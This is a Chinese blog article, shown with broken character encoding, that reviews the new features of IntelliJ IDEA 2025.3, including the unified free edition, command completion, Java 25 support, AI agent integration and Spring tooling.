<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad6fdb44ee4941eba058e654fd2e2146~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=uxDEVuBuvZbR1%2BBGGJAOWgsDc4g%3D" alt="" loading="lazy"/></p>
<p>ä»è¿™ä¸ªç‰ˆæœ¬å¼€å§‹ï¼ŒIDEA Ultimate ç»ˆæç‰ˆå’Œ Community Edition ç¤¾åŒºç‰ˆæ­£å¼ <strong>åˆäºŒä¸ºä¸€</strong>ï¼Œåªæœ‰ä¸€ä¸ªå®‰è£…åŒ…ï¼Œä¸éœ€è¦çº ç»“é€‰å“ªä¸ªç‰ˆæœ¬äº†ã€‚</p>
<p>åœ¨ç»Ÿä¸€ç‰ˆ IDEA ä¸­ï¼Œè®¢é˜… Ultimate å¯ä»¥è§£é”æ‰€æœ‰é«˜çº§ä¸“ä¸šåŠŸèƒ½ã€‚ä½†å³ä½¿æ²¡æœ‰è®¢é˜…ï¼ŒIDEA ä¾ç„¶èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ï¼Œå¯ä»¥ <strong>å…è´¹ç”¨äºå•†ä¸šå’Œéå•†ä¸šé¡¹ç›®</strong>ï¼Œç•…äº« Java å’Œ Kotlin å¼€å‘æ‰€éœ€çš„å…¨éƒ¨åŠŸèƒ½ã€‚</p>
<p>è€Œä¸”è¿™æ¬¡æ›´æ–°ï¼Œå®˜æ–¹ç»™å…è´¹ç‰ˆ <strong>å¢åŠ äº†å¾ˆå¤šæ–°åŠŸèƒ½</strong>ï¼Œç¡®å®æ¯”ä»¥å‰é¦™å¤šäº†ã€‚</p>
<p>ä»¥å‰ IDEA ç¤¾åŒºç‰ˆæ”¯æŒçš„å¼€å‘æ¡†æ¶å¾ˆæœ‰é™ï¼Œè¿ä½¿ç”¨ Java ä¸»æµçš„ Spring æ¡†æ¶å¼€å‘éƒ½ä¼šå—åˆ°é™åˆ¶ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆé‚£ä¹ˆå¤šäºº <strong>æƒ³æ–¹è®¾æ³•</strong> éƒ½è¦ä½¿ç”¨ Ultimate ç‰ˆæœ¬çš„åŸå› ã€‚å¯ä»¥è¯´ï¼Œä¸å¼€ Ultimate ç‰ˆæœ¬ IDEA å°±åºŸäº†ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6151ef3350a14f3e9950bdcb011f5bd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=aXqueWMRZK4J78rC76NHp58JenA%3D" alt="" loading="lazy"/></p>
<p>ä½†æ˜¯ä» 2025.3 ç‰ˆæœ¬å¼€å§‹ï¼Œå…è´¹ç‰ˆç”¨æˆ·å¯ä»¥ä½¿ç”¨å¾ˆå¤šä¹‹å‰ Ultimate ç‰ˆæœ¬æ‰æœ‰çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>æ•°æ®åº“é›†æˆï¼šå¯ä»¥åˆ›å»ºæ•°æ®åº“è¿æ¥ã€æŸ¥çœ‹æ•°æ®åº“æ¶æ„å’Œå¯¹è±¡ï¼Œå¼€å‘æ—¶ç›´æ¥åœ¨ IDEA å†…æŸ¥çœ‹æ•°æ®åº“è®¾è®¡</li>
<li>Spring é¡¹ç›®å‘å¯¼ï¼šå¿«é€Ÿåˆ›å»º Spring Boot é¡¹ç›®</li>
<li>æ¡†æ¶ä»£ç åŸºç¡€é«˜äº®ï¼šSpringã€Jakarta EE ä»¥åŠ Thymeleaf ç­‰æ¨¡æ¿å¼•æ“çš„åŸºç¡€è¯­æ³•é«˜äº®æ˜¾ç¤º</li>
<li>å®Œæ•´çš„ SQL è¯­è¨€æ”¯æŒ</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf504136eb6b48d9a7399a60be1b00d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=GarboT1PvnIVqqSQZgs9ZoOp02c%3D" alt="" loading="lazy"/></p>
<p>è¿™äº›èƒ½åŠ›ä¸€åŠ ä¸Šï¼Œæ„Ÿè§‰å·²ç»èƒ½å¤Ÿæ»¡è¶³åˆå­¦è€…çš„ä½¿ç”¨éœ€æ±‚äº†ã€‚</p>
<p>å¯¹äºèŒæ–°ï¼Œä¸ç”¨è´¹åŠ›å†å»æ‰¾ç ´è§£ï¼Œè€Œæ˜¯ç«‹åˆ»ä¸Šå·å­¦èµ·æ¥ã€‚ç­‰éœ€è¦ç”¨åˆ°é«˜çº§åŠŸèƒ½çš„æ—¶å€™ï¼Œå…ˆä¸€é”®æ¿€æ´» Ultimate è¯•ç”¨ï¼Œå…è´¹ä½“éªŒ 30 å¤©çš„æ‰€æœ‰é«˜çº§åŠŸèƒ½ã€‚è¯•ç”¨ç»“æŸåï¼Œå¯ä»¥å†æ ¹æ®éœ€è¦è®¢é˜…ç»ˆæç‰ˆï¼Œæˆ–è€…ç»§ç»­å…è´¹ä½¿ç”¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a9d708e49b24b72871de6a6fb24e2a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=MQQzRuN7v2V4ZXN6tL%2BYBjsgRv4%3D" alt="" loading="lazy"/></p>
<p>ä¸åƒä»¥å‰ï¼Œå¦‚æœè®¢é˜…åˆ°æœŸï¼ŒIDEA Ultimate ç‰ˆæœ¬è¿é¡¹ç›®éƒ½æ— æ³•æ­£å¸¸æ‰“å¼€ï¼è€Œç°åœ¨åˆ°æœŸåä¼šè‡ªåŠ¨é€€å›åˆ°å…è´¹ç‰ˆåŠŸèƒ½ï¼Œé¡¹ç›®è¿˜èƒ½æ­£å¸¸æ‰“å¼€å’Œç¼–è¾‘ï¼Œè¿™å¯¹ä¸´æ—¶éœ€è¦æŸ¥çœ‹ä»£ç çš„åœºæ™¯æ¥è¯´å¤ªæ–¹ä¾¿äº†ã€‚</p>
<p>è®©æˆ‘æ„å¤–çš„æ˜¯ï¼Œè™½ç„¶åˆå¹¶äº†ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä½†ç»Ÿä¸€ç‰ˆçš„å®‰è£…åŒ…æ¯”ä¹‹å‰å•ä¸ª Ultimate ç‰ˆæœ¬è¿˜å°äº† 30%ï¼Œä¸ç”¨æ‹…å¿ƒä¼šå˜æ…¢ã€‚</p>
<p>å½“ç„¶äº†ï¼Œè¿™æ¬¡æ›´æ–°ä¸ä»…ä»…æ˜¯ç‰ˆæœ¬ç»Ÿä¸€ï¼Œè¿˜æœ‰ä¸€å¤§æ³¢å®ç”¨çš„æ–°ç‰¹æ€§ã€‚ä¸‹é¢æˆ‘å°±å¸¦å¤§å®¶è¯¦ç»†äº†è§£ä¸€ä¸‹è¿™æ¬¡æ›´æ–°çš„äº®ç‚¹ï¼Œè™½ç„¶æˆ‘å·²ç»å–ç²¾å»ç³™äº†ï¼Œä½†å†…å®¹è¿˜æ˜¯å¾ˆé•¿ï¼Œèƒ½è¯»å®Œçš„è¯æˆ‘é«˜ä½å¾—ç»™ä½ ç£•ä¸€ä¸ªã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8a0a78669c24f1eaacfc83a7dea77bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=%2FCPjO6ug6El5PWLNd4a29q4TcSc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">IDEA 2025.3 æ–°ç‰¹æ€§</h2>
<h3 data-id="heading-1">å…¨éƒ¨ç”¨æˆ·å¯ç”¨çš„æ–°ç‰¹æ€§</h3>
<h4 data-id="heading-2">å‘½ä»¤è¡¥å…¨</h4>
<p>è¿™æ˜¯æˆ‘è®¤ä¸ºæœ¬æ¬¡æ›´æ–°æœ€å®ç”¨çš„æ–°åŠŸèƒ½ â€”â€” å‘½ä»¤è¡¥å…¨ï¼ˆCommand Completionï¼‰ã€‚å®ƒè®©ä½ å¯ä»¥ç›´æ¥ä»ä»£ç è¡¥å…¨ä¸­è®¿é—®ä¸Šä¸‹æ–‡ç›¸å…³çš„æ“ä½œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0cdf1b701cb47e5b9cccbe728177e7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=8%2Bci%2B9cSXrcGR8L5UKpMXXiv7T8%3D" alt="" loading="lazy"/></p>
<p>å¯èƒ½æœ‰åŒå­¦ä¼šé—®ï¼Œä»¥å‰åœ¨ IDEA é‡ŒæŒ‰ <code>.</code> ä¸å°±æœ‰ä»£ç è¡¥å…¨å—ï¼Ÿè¿™ä¸ªå‘½ä»¤è¡¥å…¨å’Œä»¥å‰æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p>
<ul>
<li>ä»¥å‰çš„ä»£ç è¡¥å…¨ï¼šå½“ä½ æŒ‰ä¸‹ <code>.</code> æ—¶ï¼ŒIDEA ä¼šæç¤ºå½“å‰å¯¹è±¡å¯ç”¨çš„æ–¹æ³•ã€å±æ€§ç­‰ä»£ç å»ºè®®ï¼Œä¸»è¦æ˜¯å¸®ä½ å¿«é€Ÿå†™ä»£ç ã€‚</li>
<li>ç°åœ¨çš„å‘½ä»¤è¡¥å…¨ï¼šåœ¨åŸæœ‰ä»£ç è¡¥å…¨çš„åŸºç¡€ä¸Šï¼Œ<strong>é¢å¤–å¢åŠ äº† IDE æ“ä½œå»ºè®®</strong>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤äº†ä»£ç æç¤ºï¼Œè¿˜ä¼šæ˜¾ç¤ºå½“å‰ä¸Šä¸‹æ–‡ä¸­å¯ä»¥æ‰§è¡Œçš„ IDE åŠŸèƒ½ï¼Œæ¯”å¦‚é‡æ„ã€ä»£ç ç”Ÿæˆã€å¿«é€Ÿä¿®å¤ç­‰ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3018e764a6654ede8694303320a6a021~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=nn385o4mofp7fVAXHLpBZhaZzZg%3D" alt="" loading="lazy"/></p>
<p>å…·ä½“ç”¨æ³•ä¹Ÿå¾ˆç®€å•ï¼š</p>
<ul>
<li>è¾“å…¥ <code>.</code> å¯ä»¥çœ‹åˆ°ä»£ç è¡¥å…¨ã€åç¼€è¡¥å…¨å»ºè®®ï¼Œ<strong>ä»¥åŠ IDE æ“ä½œå»ºè®®</strong></li>
<li>è¾“å…¥ <code>..</code> å¯ä»¥ <strong>åªæ˜¾ç¤º IDE æ“ä½œé€‰é¡¹</strong>ï¼Œè¿‡æ»¤æ‰ä»£ç è¡¥å…¨</li>
<li>é€‰æ‹©ä¸€ä¸ªæ“ä½œåï¼Œå¯ä»¥é¢„è§ˆè¿™ä¸ªæ“ä½œä¼šäº§ç”Ÿä»€ä¹ˆæ•ˆæœ</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bb952370f414addac6f6f23a297301a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=36lIVXNSJA4B4YtiFGkgW8moaWU%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªåŠŸèƒ½æœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œä½ ä¸ç”¨å†è®°ä½é‚£ä¹ˆå¤šå¿«æ·é”®äº†ï¼æƒ³åšä»€ä¹ˆæ“ä½œï¼Œç›´æ¥è¾“å…¥ <code>..</code> ç„¶åæœç´¢å°±è¡Œã€‚æ¯”å¦‚æƒ³é‡å‘½åä¸€ä¸ªå˜é‡ï¼Œä»¥å‰å¯èƒ½è¦è®°ä½å¿«æ·é”®ï¼Œç°åœ¨åªéœ€è¦è¾“å…¥ <code>..rename</code> å°±èƒ½æ‰¾åˆ°é‡å‘½ååŠŸèƒ½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce9a971ff13c4a5290a95e9f419fc09c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=K%2BuLihqRvMtGM0jhc%2FKQbkTd2t8%3D" alt="" loading="lazy"/></p>
<p>å†ä¸¾ä¸ªä¾‹å­ï¼Œè¦ç”Ÿæˆä»£ç ï¼Œåªéœ€è¦æ•² <code>..generate</code> å°±è¡Œï¼Œä¸éœ€è¦è®°ä½å¤æ‚çš„ç»„åˆå¿«æ·é”®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4304d1bb3124f94977619bea672077a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=PoA%2F9xHd6gE6gXTzf%2FSRCyStsl4%3D" alt="" loading="lazy"/></p>
<p>ç›¸æ¯” Search Everywhereï¼ˆåŒå‡» Shiftï¼‰åŠŸèƒ½æ¥è¯´ï¼Œæ“ä½œæ›´å¿«ï¼Œä¸ç”¨ç¦»å¼€ç¼–è¾‘å™¨ã€ä¸ä¼šæ‰“æ–­ä»£ç æµã€‚</p>
<p>ç»™æˆ‘çš„æ„Ÿè§‰æ˜¯ï¼Œä»¥åå†™ä»£ç çš„ä½“éªŒæ›´åƒæ˜¯å†™æ–‡ç« äº†â€¦â€¦</p>
<p>è¿™ä¸ªåŠŸèƒ½åº”è¯¥æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œæ²¡å¼€å¯çš„è¯å¯ä»¥åˆ°è®¾ç½®ä¸­æ‰‹åŠ¨å¼€å¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95627b1be6a54af5ad6db40a73f5aa52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=86xZ%2BI%2FncCgM63RaQZUxKTVSRHs%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-3">Java 25 å®Œæ•´æ”¯æŒ</h4>
<p>2025 å¹´ 9 æœˆå‘å¸ƒçš„ Java 25 æ˜¯ä¸‹ä¸€ä¸ªé•¿æœŸæ”¯æŒï¼ˆLTSï¼‰ç‰ˆæœ¬ã€‚IntelliJ IDEA ä»ç¬¬ä¸€å¤©å°±æ”¯æŒ Java 25ï¼Œç¡®ä¿å¼€å‘è€…èƒ½ç«‹åˆ»å—ç›Šäºæœ€æ–°çš„è¯­è¨€ã€è¿è¡Œæ—¶å’Œå·¥å…·å¢å¼ºã€‚</p>
<p>åœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼ŒIDEA æ·»åŠ äº†æœ€åçš„æ¶¦è‰² â€”â€” ç¡®ä¿æ‰€æœ‰æ†ç»‘å·¥å…·å’Œåº“ï¼ˆåŒ…æ‹¬ Async Profiler 4.1 å’Œ JaCoCoï¼‰éƒ½å’Œ Java 25 è¿è¡Œæ—¶å…¼å®¹ã€‚</p>
<p>æ‰€æœ‰ä¸»è¦ä¾›åº”å•†çš„ JDK 25 æ„å»ºç‰ˆæœ¬ï¼ˆæ¯”å¦‚ Oracle OpenJDKã€IBM Semeru J9ã€GraalVM å’Œ Microsoft Build of OpenJDKï¼‰ï¼Œéƒ½å¯ä»¥ç›´æ¥ä» IntelliJ IDEA ä¸‹è½½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/80dad054001a4cfba1f0fffc8a4083df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=IOFkgD82AJCfRzznW18zOuWtpT0%3D" alt="" loading="lazy"/></p>
<p>ğŸ‘‰ğŸ» å¯ä»¥çœ‹é±¼çš®çš„è¿™ä¸ªè§†é¢‘æ¥å¿«é€Ÿäº†è§£ Java 25 æ ¸å¿ƒç‰¹æ€§ï¼š</p>
<h4 data-id="heading-4">Islands ä¸»é¢˜</h4>
<p>Islands ä¸»é¢˜ç°åœ¨æˆä¸º IntelliJ IDEA çš„é»˜è®¤å¤–è§‚ã€‚è¿™ä¸ä»…ä»…æ˜¯è§†è§‰ä¸Šçš„æ›´æ–°ï¼Œæ›´ä½“ç°äº† JetBrains å¯¹å¼€å‘ä½“éªŒçš„è¿½æ±‚ã€‚</p>
<p>æˆ‘ä¸ªäººè¿˜æŒºå–œæ¬¢è¿™ä¸ªä¸»é¢˜çš„ï¼Œä¸€çœ¼å°±èƒ½è¯†åˆ«çš„æ ‡ç­¾é¡µã€æ”¹è¿›çš„ç¼–è¾‘å™¨å¯¹æ¯”åº¦ã€å·¥ä½œåŒºåŸŸä¹‹é—´çš„æ¸…æ™°åˆ†éš”ã€ä»¥åŠåœ†è§’è®¾è®¡ï¼Œç›¸æ¯”ä»¥å‰çš„ UIï¼Œä¼šç»™æˆ‘ä¸€ç§æ›´æŸ”å’Œçš„æ„Ÿè§‰ã€‚ä¸å–œæ¬¢çš„åŒå­¦æ¢å›è€ UI å°±å¥½~</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0c0df117c474cfbbc5621c3e0c2ecd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=lYXHg63xhnhEoNjzGYCfXFHW80A%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-5">AI ä½“éªŒå‡çº§</h4>
<p>JetBrains AI æ­£åœ¨ä¸æ–­è¿›åŒ–ï¼Œç»™ç”¨æˆ·æ›´å¤šé€‰æ‹©ã€é€æ˜åº¦å’Œçµæ´»æ€§ã€‚åŒ…æ‹¬ï¼š</p>
<p>1ï¼‰å¤šä»£ç†ä½“éªŒï¼šJunie å’Œ Claude Agent</p>
<p>ç°åœ¨ï¼Œå¤šä¸ªä»£ç†å¯ä»¥ä»åŒä¸€ä¸ªèŠå¤©ç•Œé¢ä½¿ç”¨ï¼Œä½ å¯ä»¥æ— ç¼åˆ‡æ¢ï¼Œä¸ºæ¯ä¸ªä»»åŠ¡è·å¾—æ­£ç¡®çš„å¸®åŠ©ã€‚é™¤äº† Junieï¼Œè¿˜åŸç”Ÿé›†æˆäº†ç¬¬ä¸€ä¸ªç¬¬ä¸‰æ–¹ AI ä»£ç† â€”â€” Claude Agentã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/191595a9661b4b5592145bc8767f2711~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=%2FGJqghO66nuRtgQzK9LniSmvl2A%3D" alt="" loading="lazy"/></p>
<p>2ï¼‰é€æ˜çš„ AI é…é¢è·Ÿè¸ª</p>
<p>ç›‘æ§å’Œç®¡ç† AI èµ„æºå˜å¾—æ›´å®¹æ˜“äº†ï¼Œç°åœ¨å¯ä»¥ç›´æ¥åœ¨ IDEA å†…æŸ¥çœ‹å‰©ä½™çš„ AI Creditsã€ç»­è®¢æ—¥æœŸå’Œå……å€¼ä½™é¢ã€‚</p>
<p>æˆ‘å¿…é¡»è¦åæ§½ä¸€ä¸‹ï¼Œè¿™ä¸ªåŠŸèƒ½æ—©å°±è¯¥æœ‰äº†å§ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ba1a51c94d64865adae62f723cb7173~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=X9qsvuwypaUBijVG%2FbYcOyf6CUc%3D" alt="" loading="lazy"/></p>
<p>3ï¼‰Bring Your Own Keyï¼ˆå³å°†æ¨å‡ºï¼‰</p>
<p>å¼€å‘è€…èƒ½å¤Ÿä½¿ç”¨è‡ªå·±çš„ API å¯†é’¥è¿æ¥åˆ° OpenAIã€Anthropic æˆ–ä»»ä½•å…¼å®¹ OpenAI API çš„æœ¬åœ°æ¨¡å‹ï¼Œè€Œæ— éœ€ç™»å½• JetBrains AIã€‚è¿™è®©å¼€å‘è€…å¯¹äºå¦‚ä½•åœ¨ IDEA ä¸­ä½¿ç”¨ AI æœ‰æ›´å¤šæ§åˆ¶æƒã€‚</p>
<p>æˆ‘ä¸ªäººæ˜¯éå¸¸æœŸå¾…è¿™ä¸ªåŠŸèƒ½çš„ï¼Œæœ‰å¯èƒ½ä¼šæŠŠæˆ‘çš„å¼€å‘ä¹ æƒ¯ä»ç¬¬ä¸‰æ–¹ AI ä¸­å†æ‹‰å›æ¥ã€‚</p>
<h4 data-id="heading-6">æŠ€æœ¯æ ˆæ”¯æŒæ›´æ–°</h4>
<p>é™¤äº† Java 25 ç­‰ä¸»è¦æ›´æ–°ï¼ŒIntelliJ IDEA 2025.3 è¿˜å¼•å…¥äº†å¯¹ä»¥ä¸‹æŠ€æœ¯çš„æ”¯æŒï¼š</p>
<ul>
<li>JUnit 6ï¼šä¸ºæµ‹è¯•ç”Ÿæ€ç³»ç»Ÿå¸¦æ¥ç°ä»£åŒ–å’Œç»Ÿä¸€ï¼Œæ ‡å‡†åŒ–æ‰€æœ‰ JUnit æ¨¡å—çš„å·¥ä»¶ç‰ˆæœ¬ï¼Œå¹¶å°†åŸºå‡†æå‡åˆ° Java 17</li>
<li>Gradle 9ï¼šå¼•å…¥é…ç½®ç¼“å­˜ä½œä¸ºé¦–é€‰æ‰§è¡Œæ¨¡å¼ï¼Œå®ç°æ›´å¿«çš„æ„å»ºå’Œæ›´æµç•…çš„å¼€å‘ä½“éªŒ</li>
<li>Groovy 5ï¼šç°åœ¨ä»¥ JDK 11 ä¸ºç›®æ ‡ï¼Œæä¾›ä¸ Java 25 è¯­è¨€ç‰¹æ€§æ›´å¥½çš„å…¼å®¹æ€§</li>
<li>Scala 3.8ï¼šæ·»åŠ æ–°çš„ <code>into</code> ä¿®é¥°ç¬¦ï¼Œä½¿ç”¨ Scala 3 ç¼–è¯‘çš„æ ‡å‡†åº“ï¼Œæœ€ä½ JDK è¦æ±‚æ›´æ–°ä¸º 17</li>
</ul>
<p>ä¸è¿‡æˆ‘ä¼°è®¡å¤§å¤šæ•°åŒå­¦ç”¨ä¸ä¸Šï¼Œäº†è§£å³å¯ã€‚</p>
<h4 data-id="heading-7">Develocity IntelliJ æ’ä»¶</h4>
<p>Develocity IntelliJ æ’ä»¶å°†æ€§èƒ½åˆ†æå¸¦å…¥æ„å»ºè¿‡ç¨‹ã€‚é€šè¿‡å®ƒï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ IDEA ä¸­æŸ¥çœ‹è¯¦ç»†çš„æ„å»ºç‰¹å¾ï¼Œè¯†åˆ«æ€§èƒ½ç“¶é¢ˆï¼Œè§‚å¯Ÿæ„å»ºæ›´æ”¹å¦‚ä½•å½±å“é€Ÿåº¦å’Œèµ„æºåˆ©ç”¨ç‡ã€‚ä¸éœ€è¦ä¿®æ”¹æ„å»ºè„šæœ¬ â€”â€” åªéœ€åœ¨æ’ä»¶ä¸­å¯ç”¨ç›¸åº”è®¾ç½®å³å¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ed96287b47847faa999970b30d252b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=s3oTZ76dSHHuUYmRStvRWw%2FbWY0%3D" alt="" loading="lazy"/></p>
<p>æ¯”å¦‚ï¼Œä½ å¯ä»¥è½»æ¾æ£€æµ‹åˆ°ä¸€ä¸ªæ²¡æœ‰ä½¿ç”¨æ„å»ºç¼“å­˜è€Œä¸å¿…è¦è¿è¡Œçš„ä»»åŠ¡ã€‚è¿™åœ¨æ—¥å¿—ä¸­å¯èƒ½å¾ˆéš¾æ³¨æ„åˆ°ï¼Œä½†åœ¨å¯è§†åŒ–å›¾è¡¨ä¸­ç«‹å³å°±èƒ½çœ‹æ¸…æ¥šã€‚</p>
<p>è¿™ä¸ªæ’ä»¶ç”± JetBrains å’Œ Gradle çš„ Develocity å·¥ç¨‹å¸ˆå…±åŒå¼€å‘ï¼Œå’Œ IDEA UI æ— ç¼é›†æˆï¼Œä¸éœ€è¦æ”¹å˜ç°æœ‰å·¥ä½œæµç¨‹ã€‚ç›®å‰æ’ä»¶æ”¯æŒ Gradle æ„å»ºï¼ŒMaven æ”¯æŒä¹Ÿå³å°†æ¨å‡ºã€‚</p>
<h3 data-id="heading-8">Ultimate ä¸“å±æ–°ç‰¹æ€§</h3>
<p>è€ƒè™‘åˆ°ä¸å°‘åŒå­¦ä½¿ç”¨å…è´¹ç‰ˆæœ¬ï¼Œè¿™éƒ¨åˆ†æˆ‘å°±ç®€å•æä¸€å˜´ã€‚</p>
<h4 data-id="heading-9">Spring Boot 4 å’Œ Spring Framework 7 æ”¯æŒ</h4>
<p>IntelliJ IDEA 2025.3 å¯¹ Spring Framework 7 å’Œ Spring Boot 4 æä¾›äº†ä¸€æµçš„æ”¯æŒï¼ŒåŒ…æ‹¬ API ç‰ˆæœ¬æ§åˆ¶ã€å¿«é€Ÿåˆ›å»º HTTP æœåŠ¡å®¢æˆ·ç«¯ã€ç†è§£ Spring 7 åŠ¨æ€æ³¨å†Œçš„ beans ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1eca01bdb1f744f1a26c89009635e7b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=FKbDnqJUGtr%2Fa4%2BND7vsLgHNOPI%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-10">Spring Data JDBC æ”¯æŒ</h4>
<p>éšç€ Spring Data JDBC è¶Šæ¥è¶Šå—æ¬¢è¿ï¼ŒIntelliJ IDEA å¸¦æ¥äº†ä¸ Spring Data JPA åŒç­‰çº§çš„ä¸€æµæ”¯æŒï¼Œä½ å¯ä»¥ï¼š</p>
<ul>
<li>ä»ç°æœ‰æ•°æ®åº“è¡¨ç”Ÿæˆå®ä½“ç±»ï¼ŒåŒ…æ‹¬å¤åˆé”®</li>
<li>ä» <code>@Table</code> ç±»ç”Ÿæˆ DDLï¼Œæ”¯æŒ Liquibase å’Œ Flyway</li>
<li>æ¯”è¾ƒä»£ç æ¨¡å‹ä¸æ•°æ®åº“ï¼Œåˆ›å»ºå¯¹é½è„šæœ¬</li>
<li>å³æ—¶åˆ›å»º Spring Data repositories å¹¶è¿æ¥åˆ°ä»£ç </li>
<li>æ™ºèƒ½è¡¥å…¨ Spring Data repository æ´¾ç”ŸæŸ¥è¯¢æ–¹æ³•</li>
<li>é€šè¿‡è¡¥å…¨ç›´æ¥åœ¨å®ä½“ç±»ä¸­æ·»åŠ è¡¨åˆ—</li>
</ul>
